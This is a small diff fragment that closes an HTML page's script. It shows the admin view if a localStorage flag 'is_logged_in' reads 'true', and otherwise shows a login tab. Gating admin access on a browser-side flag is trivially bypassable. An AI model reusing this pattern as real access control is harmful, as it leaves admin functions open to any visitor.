+            else if(localStorage.getItem('is_logged_in') === 'true') {
+                showAdmin();
+            }
+            else {
+                switchTab('tabLogin');
+            }
+        };
+    </script>
+</body>
+</html>
